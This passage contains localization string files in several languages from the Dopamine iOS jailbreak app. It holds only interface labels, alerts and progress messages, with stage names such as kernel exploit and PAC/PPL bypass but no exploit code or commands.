"Removed_Jailbreak_Alert_Message" = "Successfully removed jailbreak. Rebooting the device is recommended.";
"Button_Close" = "Close";

// Error View
"Button_Share" = "Share";
"Button_Reboot" = "Reboot";

// Settings Options
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (Developer Shell)";
"Settings_Verbose_Logs" = "Verbose Logs";
"Settings_Apps_JIT" = "Allow JIT in Apps";
"Settings_Allow_Old_arm64e_ABI_Libraries" = "Allow Legacy arm64e Libraries";
"Settings_Jetsam_Multiplier" = "Jetsam Multiplier";

// Settings Buttons
"Button_Remove_Jailbreak" = "Remove Jailbreak";
"Button_Hide_Jailbreak" = "Hide Jailbreak";
"Button_Unhide_Jailbreak" = "Unhide Jailbreak";
"Button_Refresh_Jailbreak_Apps" = "Refresh Jailbreak Apps";
"Button_Reinstall_Package_Managers" = "Reinstall Package Managers";
"Button_Change_Mobile_Password" = "Change \"mobile\" Password";

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Hide Jailbreak\" temporarily removes jailbreak-related files until the next rejailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Hide Jailbreak\" partially disables the jailbreak and aims to make detection more challenging. However, it is not entirely effective and does not conceal everything.";
"Section_Jailbreak_Settings" = "Jailbreak Settings";
"Section_Actions" = "Actions";
"Section_Customization" = "Customization";
"Section_Exploits" = "Exploits";
"Section_Boot_Logo" = "Boot Logo";
"Jetsam_Description" = "Jetsam is a system feature that will automatically kill processes whose memory usage exceeds a specified limit. When many tweaks are installed, it is possible for this limit to be exceeded right at launch, causing processes to crash loop. Here you can select a multiplier that the memory limit of all processes launched with a memory limit will be multiplied by. Increase this setting when stuff is crash looping or if you encounter weird system behaviour when a large number of tweaks are installed. To not negatively impact the memory usage of the entire system, it is recommended to select the lowest option under which the system is stable.";
"Enabled" = "Enabled";
"Custom_Boot_Logo" = "Custom Boot Logo";
"Select_Image" = "Select Image";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Userspace Reboot Required";
"Alert_Tweak_Injection_Toggled_Body" = "A userspace reboot is neccessary to apply the changes. Do you want to do it now?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "Reboot Now";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "Reboot Later";
"Alert_Remove_Jailbreak_Title" = "Remove Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Removing jailbreak will delete all jailbreak-related files, but all regular apps, files and data will be kept. Are you sure you want to continue? You can't undo this action.";
"Alert_Remove_Jailbreak_Enabled_Body" = "Enabling \"Remove Jailbreak\" will delete all jailbreak-related files on the next jailbreak, but all regular apps, files and data will be kept. Are you sure you want to continue? You can't undo this action.";
"Alert_Change_Mobile_Password_Body" = "Set the password of the \"mobile\" user on your device, this can also be used for root access using sudo. If you want to set the root password, you can do so from a mobile shell using the command \"sudo passwd root\"";
"Password_Placeholder" = "Password";
"Repeat_Password_Placeholder" = "Repeat Password";
"Password_Auth_Required" = "Authentication is required to change your mobile password.";
"Button_Change" = "Change";
"Button_Cancel" = "Cancel";
"Button_Continue" = "Continue";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "There are multiple apps with the identifier \"%@\" inside Dopamines application directory (\"%@\"). Cannot continue.";
"Duplicate_Apps_Error_User_App" = "The apps with the identifiers %@ exist in Dopamines application directory (\"%@\") but are also installed separately on the system. Cannot continue.";
"Duplicate_Apps_Error_Icon_Cache" = "The app with the identifier \"%@\" exists in the Dopamine application directory (\"%@\") but is also registered in icon cache under a different path (\"%@\"). Cannot continue.";

// Settings Lists
"Theme" = "Theme";
"Kernel Exploit" = "Kernel Exploit";
"PPL Bypass" = "PPL Bypass";
"PAC Bypass" = "PAC Bypass";
"None" = "None";
"Recommended" = "Recommended";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licenses";
"Credits_Button_Source_Code" = "Source Code";

// Logs
"Initializing Environment" = "Initializing Jailbreak Environment";
"Initializing Protection" = "Initializing Protection";
"Loading BaseBin TrustCache" = "Loading BaseBin TrustCache";
"Applying Bind Mount" = "Applying Bind Mount";
"Removing Jailbreak" = "Removing Jailbreak";
"Elevating Privileges" = "Elevating Privileges";
"Cleaning Up Exploits" = "Cleaning Up Exploits";
"Building Phys R/W Primitive" = "Building Phys R/W Primitive";
"Rebooting Userspace" = "Rebooting Userspace";
"Patchfinding" = "Patchfinding";
"Exploiting Kernel (%@)" = "Exploiting Kernel (%@)";
"Bypassing PAC (%@)" = "Bypassing PAC (%@)";
"Bypassing PPL (%@)" = "Bypassing PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Select Package Manager(s)";
"Select_Package_Managers_Install_Message" = "If you are unsure which one to select, select Sileo";
"Continue" = "Continue";

```

`Application/Dopamine/es.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "por opa334, ElleKit por évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "Error";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
"Unsupported" = "No compatible";

// Action Menu
"Menu_Settings_Title" = "Ajustes";
"Menu_Restart_SpringBoard_Title" = "Reiniciar SpringBoard";
"Menu_Reboot_Userspace_Title" = "Reiniciar el Espacio de Usuario";
"Menu_Credits_Title" = "Créditos";

// Updating
"Button_Update" = "Actualización";
"Button_Update_Available" = "Actualización disponible";
"Button_Update_Environment" = "Actualizar entorno";

// Update View
"Update_Status_Downloading" = "Descargando actualización...";
"Update_Status_Subtitle_Please_Wait" = "Espere mientras se descargan los archivos";
"Update_Status_Installing" = "Instalando actualización...";
"Update_Status_Subtitle_Restart_Soon" = "El dispositivo se reiniciará pronto";
"Title_Changelog" = "Lista de cambios";
"Changelog_Unavailable_Text" = "Lista de cambios no disponible";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Eliminar Jailbreak";
"Removed_Jailbreak_Alert_Message" = "Eliminado con éxito el jailbreak. Se recomienda reiniciar el dispositivo.";
"Button_Close" = "Cerrar";

// Error View
"Button_Share" = "Compartir";
"Button_Reboot" = "Reiniciar";

// Settings Options
"Settings_Tweak_Injection" = "Inyección de ajustes";
"Settings_iDownload" = "iDownload (Shell de desarrollador)";
"Settings_Verbose_Logs" = "Registros detallados";
"Settings_Apps_JIT" = "Permitir JIT en las aplicaciones";
"Settings_Jetsam_Multiplier" = "Multiplicador Jetsam";

// Settings Buttons
"Button_Remove_Jailbreak" = "Eliminar Jailbreak";
"Button_Hide_Jailbreak" = "Ocultar Jailbreak";
"Button_Unhide_Jailbreak" = "Desocultar Jailbreak";
"Button_Refresh_Jailbreak_Apps" = "Actualizar aplicaciones Jailbreak";
"Button_Reinstall_Package_Managers" = "Reinstalar los gestores de paquetes";
"Button_Change_Mobile_Password" = "Cambiar contraseña de \"mobile\"";

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Ocultar Jailbreak\" elimina temporalmente los archivos relacionados con el jailbreak hasta el próximo rejailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Ocultar Jailbreak\" desactiva parcialmente el jailbreak y pretende hacer más difícil su detección. Sin embargo, no es del todo eficaz y no lo oculta todo.";
"Section_Jailbreak_Settings" = "Ajustes de Jailbreak";
"Section_Actions" = "Acciones";
"Section_Customization" = "Personalización";
"Section_Exploits" = "Exploits";
"Jetsam_Description" = "Jetsam es una característica del sistema que matará automáticamente los procesos cuyo uso de memoria supere un límite especificado. Cuando se instalan muchos tweaks, es posible que este límite se exceda justo en el lanzamiento, causando que los procesos se bloqueen en bucle. Aquí puede seleccionar un multiplicador por el que se multiplicará el límite de memoria de todos los procesos lanzados con un límite de memoria. Aumente este valor cuando se produzca un bucle de bloqueo o si encuentra un comportamiento extraño del sistema cuando se instala un gran número de tweaks. Para no impactar negativamente en el uso de memoria de todo el sistema, se recomienda seleccionar la opción más baja bajo la cual el sistema sea estable.";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Es necesario reiniciar el Espacio de Usuario";
"Alert_Tweak_Injection_Toggled_Body" = "Es necesario reiniciar el Espacio de Usuario para aplicar los cambios. ¿Desea hacerlo ahora?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "Reinicie ahora";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "Reiniciar más tarde";
"Alert_Remove_Jailbreak_Title" = "Quitar Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Al eliminar jailbreak se borrarán todos los archivos relacionados con jailbreak, pero se conservarán todas las aplicaciones, archivos y datos normales. ¿Estás seguro de que quieres continuar? No puedes deshacer esta acción";
"Alert_Remove_Jailbreak_Enabled_Body" = "Al activar \"Quitar Jailbreak\" se eliminarán todos los archivos relacionados con el jailbreak en el próximo jailbreak, pero se conservarán todas las aplicaciones, archivos y datos normales. ¿Estás seguro de que quieres continuar? No puedes deshacer esta acción";
"Alert_Change_Mobile_Password_Body" = "Establezca la contraseña del usuario \"mobile\" en su dispositivo, esto también se puede utilizar para el acceso root utilizando sudo. Si desea establecer la contraseña de root, puede hacerlo desde un shell móvil utilizando el comando \"sudo passwd root\"";
"Password_Placeholder" = "Contraseña";
"Repeat_Password_Placeholder" = "Repetir contraseña";
"Password_Auth_Required" = "Es necesario autenticarse para cambiar la contraseña del móvil.";
"Button_Change" = "Cambiar";
"Button_Cancel" = "Cancelar";
"Button_Continue" = "Continuar";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Existen múltiples aplicaciones con el identificador \"%@\" dentro del directorio de aplicaciones Dopamine (\"%@\"). No se puede continuar.";
"Duplicate_Apps_Error_User_App" = "Las apps con los identificadores %@ existen en el directorio de aplicaciones de Dopamine (\"%@\") pero también están instaladas por separado en el sistema. No se puede continuar";
"Duplicate_Apps_Error_Icon_Cache" = "La app con el identificador \"%@\" existe en el directorio de aplicaciones de Dopamine (\"%@\") pero también está registrada en la caché de iconos bajo una ruta diferente (\"%@\"). No se puede continuar";

// Settings Lists
"Theme" = "Tema";
"Kernel Exploit" = "Exploit del kernel";
"PPL Bypass" = "PPL Bypass";
"PAC Bypass" = "PAC Bypass";
"None" = "Ninguno";
"Recommended" = "Recomendado";

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licencias";
"Credits_Button_Source_Code" = "Código fuente";

// Logs
"Initializing Environment" = "Inicializando entorno de Jailbreak";
"Initializing Protection" = "Inicializar la protección";
"Loading BaseBin TrustCache" = "Cargando BaseBin TrustCache";
"Applying Bind Mount" = "Aplicando montaje por vínculo";
"Removing Jailbreak" = "Eliminando Jailbreak";
"Elevating Privileges" = "Elevando privilegios";
"Cleaning Up Exploits" = "Limpiando Exploits";
"Building Phys R/W Primitive" = "Construcción física R/W primitiva";
"Rebooting Userspace" = "Reiniciando el Espacio de Usuario";
"Patchfinding" = "Buscando parches";
"Exploiting Kernel (%@)" = "Explotando Kernel (%@)";
"Bypassing PAC (%@)" = "Saltando PAC (%@)";
"Bypassing PPL (%@)" = "Saltando PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Seleccione gestor(es) de paquetes";
"Select_Package_Managers_Install_Message" = "Si no está seguro de cuál seleccionar, seleccione Sileo";
"Continue" = "Continuar";

```

`Application/Dopamine/fil.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Ginawa ito ni opa334 at évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "Error";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
"Unsupported" = "Hindi suportado";

// Action Menu
"Menu_Settings_Title" = "Opsiyon";
"Menu_Restart_SpringBoard_Title" = "i-Restart ang SpringBoard";
"Menu_Reboot_Userspace_Title" = "i-Reboot ang Userspace";
"Menu_Credits_Title" = "Mga Kredito";

// Updating
"Button_Update" = "i-Update";
"Button_Update_Available" = "Meroong available na bagong update";
"Button_Update_Environment" = "i-Update ang Environment";

// Update View
"Update_Status_Downloading" = "Dina-Download ang bagong update...";
"Update_Status_Subtitle_Please_Wait" = "Antayin ang pag-dodownload ng mga files";
"Update_Status_Installing" = "Ini-install ang update...";
"Update_Status_Subtitle_Restart_Soon" = "Ang device ay mag-rerestart maya-maya";
"Title_Changelog" = "Mga Pagbabago";
"Changelog_Unavailable_Text" = "Ang mga Pagbabago ay hindi available";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Tinanggal ang Jailbreak";
"Removed_Jailbreak_Alert_Message" = "Matagumpay na tinanggal ang Jailbreak. Ini-rerekomenda ang pag-reboot ng device.";
"Button_Close" = "Isara";

// Error View
"Button_Share" = "Ibahagi";
"Button_Reboot" = "i-Reboot";

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (Terminal ng Developer)";
"Settings_Verbose_Logs" = "Mga Verbose Logs";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Tanggalin ang Jailbreak";
"Button_Hide_Jailbreak" = "Itago ang Jailbreak";
"Button_Unhide_Jailbreak" = "Ihinto ang pag-tatago ng Jailbreak";
"Button_Refresh_Jailbreak_Apps" = "i-Refresh ang mga Apps ng Jailbreak";
"Button_Reinstall_Package_Managers" = "i-Reinstall ang mga Package Managers";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Itago ang Jailbreak\" pansamantalang itatago ang mga file na nauugnay sa Jailbreak hanggang sa susunod na re-jailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Itago ang Jailbreak\" bahagyang hindi paganahin ang Jailbreak at naglalayong gawing mas mahirap ang pagtuklas nito. Gayunpaman, hindi ito ganap na epektibo at hindi ma-itago ang lahat.";
"Section_Jailbreak_Settings" = "Mga Settings ng Jailbreak";
"Section_Actions" = "Mga Aksyon";
"Section_Customization" = "Mga Customization";
"Section_Exploits" = "Mga Exploits";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Kinakailangan ang Userspace Reboot";
"Alert_Tweak_Injection_Toggled_Body" = "Ang Reboot ng Userspace ay kinakailangan upang mailapat ang mga pagbabago. Gusto mo bang gawin ito ngayon?.";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "i-Reboot na ngayon";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "i-Reboot mamaya";
"Alert_Remove_Jailbreak_Title" = "Tanggalin ang Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "Ang pag-tatanggal ng Jailbreak ay magtatanggal ng lahat ng file na nauugnay sa Jailbreak, ngunit lahat ng regular na app, file at data ay mananatili. Sigurado ka bang gusto mong magpatuloy? Hindi mo maa-undo ang pagtanggal nito.";
"Alert_Remove_Jailbreak_Enabled_Body" = "Kapag na-enable ang \"Tanggalin ang Jailbreak\" ay tatanggalin ang lahat ng file na nauugnay sa Jailbreak sa susunod na Jailbreak, ngunit lahat ng regular na app, file at data ay mananatili. Sigurado ka bang gusto mong magpatuloy? Hindi mo maa-undo ang pagtanggal nito.";
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Wag ituloy";
"Button_Continue" = "Ituloy";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Mayroong maraming app na may identifier na \"%@\" sa loob ng Dopamines application directory (\"%@\"), kaya hindi pwedeng makapag-patuloy.";
"Duplicate_Apps_Error_User_App" = "Ang mga app na may mga identifier na %@ ay umiiral sa Dopamines application directory (\"%@\") ngunit naka-install din nang hiwalay sa system, kaya hindi pwedeng makapag-patuloy.";
"Duplicate_Apps_Error_Icon_Cache" = "Ang app na may identifier na \"%@\" ay umiiral sa Dopamine application directory (\"%@\") ngunit nakarehistro din sa icon cache sa ilalim ng ibang landas (\"%@\"), kaya hindi pwedeng makapag-patuloy.";

// Settings Lists
"Theme" = "Mga Theme";
"Kernel Exploit" = "Mga Kernel Exploit";
"PPL Bypass" = "PPL Bypass";
"PAC Bypass" = "PAC Bypass";
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Lisensya";
"Credits_Button_Source_Code" = "Source Code";

// Logs
"Initializing Environment" = "Sinisimulan ang Jailbreak Environment";
/*Initializing Protection*/
"Loading BaseBin TrustCache" = "Nilo-load ang BaseBin TrustCache";
"Applying Bind Mount" = "Paglalapat ng Bind Mount";
"Removing Jailbreak" = "Tinatatanggal ang Jailbreak";
"Elevating Privileges" = "Pagtataas ng mga Privileges";
"Cleaning Up Exploits" = "Paglilinis ng mga Exploits";
"Building Phys R/W Primitive" = "Pagtatayo ng Phys R/W Primitive";
"Rebooting Userspace" = "Nire-Reboot ang Userspace";
"Patchfinding" = "Patchfinding";
"Exploiting Kernel (%@)" = "Ini-Exploit ang Kernel";
"Bypassing PAC (%@)" = "Bina-Bypass ang PAC (%@)";
"Bypassing PPL (%@)" = "Bina-Bypass ang PPL";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Pumili ng mga Package Manager(s)";
"Select_Package_Managers_Install_Message" = "Kung hindi ka sigurado kung alin ang pipiliin, piliin ang Sileo";
"Continue" = "Magpatuloy";


```

`Application/Dopamine/fr.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "par opa334, ElleKit par évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreak en cours";
"Log_Error" = "Érreur";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbreaké";
"Unsupported" = "Non supporté";

// Action Menu
"Menu_Settings_Title" = "Préférences";
"Menu_Restart_SpringBoard_Title" = "Redémarrer le SpringBoard";
"Menu_Reboot_Userspace_Title" = "Redémarrer l'environnement";
"Menu_Credits_Title" = "À propos";

// Updating
"Button_Update" = "Mettre à jour";
"Button_Update_Available" = "Mise à jour disponible";
"Button_Update_Environment" = "Mettre à jour l'environnement";

// Update View
"Update_Status_Downloading" = "Téléchargement...";
"Update_Status_Subtitle_Please_Wait" = "Veuillez patienter pendant que Dopamine télécharge et installe la mise à jour";
"Update_Status_Installing" = "Installation...";
"Update_Status_Subtitle_Restart_Soon" = "L'appareil redémarrera automatiquement une fois l'installation terminée";
"Title_Changelog" = "Nouveautés";
"Changelog_Unavailable_Text" = "Impossible de charger les changements";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Jailbreak supprimé";
"Removed_Jailbreak_Alert_Message" = "Le jailbreak a été supprimé avec succès. Un redémarrage de l'appareil est recommandé.";
"Button_Close" = "Ok";

// Error View
"Button_Share" = "Partager";
"Button_Reboot" = "Redémarrer";

// Settings Toggles
"Settings_Tweak_Injection" = "Injection de tweaks";
"Settings_iDownload" = "iDownload (Outil de dev)";
"Settings_Verbose_Logs" = "Mode verbose";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Supprimer le jailbreak";
"Button_Hide_Jailbreak" = "Mode jailbreak masqué";
"Button_Unhide_Jailbreak" = "Retour au mode jailbreaké";
"Button_Refresh_Jailbreak_Apps" = "Rafraîchir les apps jailbreakées";
"Button_Reinstall_Package_Managers" = "Réinstaller les gestionnaires de paquets";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "Le mode \"Jailbreak masqué\" enlève temporairement les fichiers liés au jailbreak jusqu'au prochain jailbreak.";
"Hint_Hide_Jailbreak_Jailbroken" = "Le mode \"Jailbreak masqué\" désactive partiellement le jailbreak et vise à rendre la détection plus difficile. Cependant, il n'est pas entièrement efficace et ne cache pas tout.";
"Section_Jailbreak_Settings" = "Paramètres du jailbreak";
"Section_Actions" = "Actions";
"Section_Customization" = "Personnalisation";
"Section_Exploits" = "Exploits";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Redémarrage nécessaire";
"Alert_Tweak_Injection_Toggled_Body" = "Un redémarrage de l'espace utilisateur est nécessaire pour appliquer les changements. Voulez-vous le faire maintenant ?";
"Alert_Tweak_Injection_Toggled_Reboot_Now" = "Redémarrer maintenant";
"Alert_Tweak_Injection_Toggled_Reboot_Later" = "Redémarrer plus tard";
"Alert_Remove_Jailbreak_Title" = "Supprimer le jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "La suppression du jailbreak effacera tous les fichiers liés au jailbreak, mais toutes les applications, fichiers et données habituels seront conservés. Êtes-vous sûr de vouloir continuer ? Vous ne pouvez pas annuler cette action.";
"Alert_Remove_Jailbreak_Enabled_Body" = "L'activation de cette option supprimera tous les fichiers liés au jailbreak au prochain jailbreak. Toutes les applications, fichiers et données habituels seront conservés. Êtes-vous sûr de vouloir continuer ?";
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Annuler";
"Button_Continue" = "Continuer";

// Duplicate Apps Errors
"Duplicate_Apps_Error_Dopamine_App" = "Il y a plusieurs applications avec l'identifiant \"%@\" dans le répertoire d'application de Dopamine (\"%@\"). Impossible de continuer.";
"Duplicate_Apps_Error_User_App" = "Les applications avec les identifiants %@ existent dans le répertoire d'application de Dopamine (\"%@\") mais sont également installées séparément sur le système. Impossible de continuer.";
"Duplicate_Apps_Error_Icon_Cache" = "L'application avec l'identifiant \"%@\" existe dans le répertoire d'application de Dopamine (\"%@\") mais est également enregistrée dans le cache d'icônes sous un chemin différent (\"%@\"). Impossible de continuer.";

// Settings Lists
"Theme" = "Thème";
"Kernel Exploit" = "Exploit du noyau";
"PPL Bypass" = "Contournement PPL";
"PAC Bypass" = "Contournement PAC";
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licenses";
"Credits_Button_Source_Code" = "Code source";

// Logs
"Initializing Environment" = "Initialisation de l'environnement";
/*Initializing Protection*/
"Loading BaseBin TrustCache" = "Chargement des signatures";
"Applying Bind Mount" = "Montage du disque virtuel";
"Removing Jailbreak" = "Suppression du jailbreak";
"Elevating Privileges" = "Elévation des privilèges";
"Cleaning Up Exploits" = "Nettoyage des exploits";
"Building Phys R/W Primitive" = "Construction de primitive Phys R/W";
"Rebooting Userspace" = "Redémarrage de l'environnement";
"Patchfinding" = "Recherche des patchs";
"Exploiting Kernel (%@)" = "Exploitation du noyau (%@)";
"Bypassing PAC (%@)" = "Contournement des PAC (%@)";
"Bypassing PPL (%@)" = "Contournement du PPL (%@)";

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Gestionnaires de paquets";
"Select_Package_Managers_Install_Message" = "Selectionnez les gestionnaires de paquets à installer, si vous n'êtes pas sûr de votre choix, sélectionnez Sileo";
"Continue" = "Continuer";


```

`Application/Dopamine/it.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Creato da opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Eseguo il Jailbreak";
"Log_Error" = "Fallito";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbreakkato";
/*Unsupported*/

// Action Menu
"Menu_Settings_Title" = "Impostazioni";
"Menu_Restart_SpringBoard_Title" = "Riavvia SpringBoard";
"Menu_Reboot_Userspace_Title" = "Riavvia Userspace";
"Menu_Credits_Title" = "Crediti";

// Updating
"Button_Update" = "Aggiorna";
"Button_Update_Available" = "Aggiornamento Disponibile";
"Button_Update_Environment" = "Aggiorna l'Ambiente";

// Update View
"Update_Status_Downloading" = "Scarico l'aggiornamento...";
"Update_Status_Subtitle_Please_Wait" = "Attendi lo scaricamento dei file";
"Update_Status_Installing" = "Installo l'aggiornamento...";
"Update_Status_Subtitle_Restart_Soon" = "Il dispositivo si riavvierà tra poco";
"Title_Changelog" = "Registro Delle Modifiche";
"Changelog_Unavailable_Text" = "Registro Delle Modifiche Non Disponibile";

// Removed Jailbreak Alert
/*Removed_Jailbreak_Alert_Title*/
/*Removed_Jailbreak_Alert_Message*/
/*Button_Close*/

// Error View
/*Button_Share*/
/*Button_Reboot*/

// Settings Toggles
"Settings_Tweak_Injection" = "Iniezione Tweak";
"Settings_iDownload" = "iDownload (Terminale per sviluppatori)";
"Settings_Verbose_Logs" = "Log Dettagliati";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Rimuovi il Jailbreak";
"Button_Hide_Jailbreak" = "Nascondi il Jailbreak";
"Button_Unhide_Jailbreak" = "Mostra il Jailbreak";
/*Button_Refresh_Jailbreak_Apps*/
"Button_Reinstall_Package_Managers" = "Reinstalla i Package Manager";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Nascondi il Jailbreak\" rimuove temporaneamente i file relativi al jailbreak fino al rejailbreak";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Nascondi il Jailbreak\" disabilita parzialmente il jailbreak e tenta di rendere più difficile il rilevamento del jailbreak. Tuttavia, non è del tutto efficace e non nasconde tutto.";
/*Section_Jailbreak_Settings*/
/*Section_Actions*/
/*Section_Customization*/
/*Section_Exploits*/

// Settings Alerts
/*Alert_Tweak_Injection_Toggled_Title*/
"Alert_Tweak_Injection_Toggled_Body" = "Il riavvio userspace è necessario per applicare modifiche. Vuoi farlo ora?";
/*Alert_Tweak_Injection_Toggled_Reboot_Now*/
/*Alert_Tweak_Injection_Toggled_Reboot_Later*/
"Alert_Remove_Jailbreak_Title" = "Rimuovi il Jailbreak";
"Alert_Remove_Jailbreak_Pressed_Body" = "La rimozione del jailbreak eliminerà tutti i file relativi al jailbreak, ma tutte le app, file, e dati personali verranno mantenuti. Sei sicuro/a di voler continuare? Non puoi annullare questa azione.";
/*Alert_Remove_Jailbreak_Enabled_Body*/
/*Alert_Change_Mobile_Password_Body*/
/*Password_Placeholder*/
/*Repeat_Password_Placeholder*/
/*Password_Auth_Required*/
/*Button_Change*/
"Button_Cancel" = "Cancella";
/*Button_Continue*/

// Duplicate Apps Errors
/*Duplicate_Apps_Error_Dopamine_App*/
/*Duplicate_Apps_Error_User_App*/
/*Duplicate_Apps_Error_Icon_Cache*/

// Settings Lists
/*Theme*/
/*Kernel Exploit*/
/*PPL Bypass*/
/*PAC Bypass*/
/*None*/
/*Recommended*/

// Credits
"Credits_Button_Discord" = "Discord";
"Credits_Button_License" = "Licenza";
"Credits_Button_Source_Code" = "Codice Sorgente";

// Logs
"Initializing Environment" = "Inizializzo l'ambiente";
/*Initializing Protection*/
/*Loading BaseBin TrustCache*/
/*Applying Bind Mount*/
/*Removing Jailbreak*/
/*Elevating Privileges*/
/*Cleaning Up Exploits*/
/*Building Phys R/W Primitive*/
/*Rebooting Userspace*/
"Patchfinding" = "Trovo patch";
/*Exploiting Kernel (%@)*/
/*Bypassing PAC (%@)*/
/*Bypassing PPL (%@)*/

// Package Manager selection
"Status_Title_Select_Package_Managers" = "Seleziona i Package Manager";
"Select_Package_Managers_Install_Message" = "Se non sei sicuro/a di quale scegliere, scegli Sileo";
"Continue" = "Continua";


```

`Application/Dopamine/ja.lproj/Localizable.strings`:

```strings
"Credits_Made_By" = "Made by opa334, évelyne";

// Log
"Status_Title_Jailbreaking" = "Jailbreaking";
"Log_Error" = "エラー";

// Jailbreak Button
"Button_Jailbreak_Title" = "Jailbreak";
"Status_Title_Jailbroken" = "Jailbroken";
"Unsupported" = "Unsupported";

// Action Menu
"Menu_Settings_Title" = "設定";
"Menu_Restart_SpringBoard_Title" = "SpringBoardを再起動";
"Menu_Reboot_Userspace_Title" = "Userspaceを再起動";
"Menu_Credits_Title" = "クレジット";

// Updating
"Button_Update" = "アップデート";
"Button_Update_Available" = "アップデートがあります";
"Button_Update_Environment" = "環境をアップデート";

// Update View
"Update_Status_Downloading" = "アップデートをダウンロード中...";
"Update_Status_Subtitle_Please_Wait" = "ファイルのダウンロードが完了するまでお待ちください";
"Update_Status_Installing" = "アップデートをインストール中...";
"Update_Status_Subtitle_Restart_Soon" = "デバイスはすぐに再起動します";
"Title_Changelog" = "更新履歴";
"Changelog_Unavailable_Text" = "更新履歴は利用できません";

// Removed Jailbreak Alert
"Removed_Jailbreak_Alert_Title" = "Jailbreak環境は削除されました";
"Removed_Jailbreak_Alert_Message" = "Jailbreak環境の削除に成功しました. デバイスの再起動をお勧めします。";
"Button_Close" = "閉じる";

// Error View
"Button_Share" = "共有";
"Button_Reboot" = "再起動";

// Settings Toggles
"Settings_Tweak_Injection" = "Tweak Injection";
"Settings_iDownload" = "iDownload (開発者用シェル)";
"Settings_Verbose_Logs" = "詳細なログ";
/*Settings_Apps_JIT*/

// Settings Buttons
"Button_Remove_Jailbreak" = "Jailbreak環境の削除";
"Button_Hide_Jailbreak" = "Jailbreakを隠す";
"Button_Unhide_Jailbreak" = "Jailbreak環境を戻す";
"Button_Refresh_Jailbreak_Apps" = "Jailbreakアプリを更新 (UICache)";
"Button_Reinstall_Package_Managers" = "パッケージマネージャーを再インストール";
/*Button_Change_Mobile_Password*/

// Settings Hints
"Hint_Hide_Jailbreak" = "\"Jailbreakを隠す\"は、次のjailbreakの実行までjailbreak関連のファイルを一時的に隠します";
"Hint_Hide_Jailbreak_Jailbroken" = "\"Jailbreakを隠す\"は、jailbreakを部分的に無効にして、jailbreak検出をより困難にすることを目的としています。しかし、この機能ではすべてを完全に隠せるわけではありません。";
"Section_Jailbreak_Settings" = "Jailbreak Settings";
"Section_Actions" = "Actions";
"Section_Customization" = "Customization";
"Section_Exploits" = "Exploits";

// Settings Alerts
"Alert_Tweak_Injection_Toggled_Title" = "Userspaceの再起動が必要です";
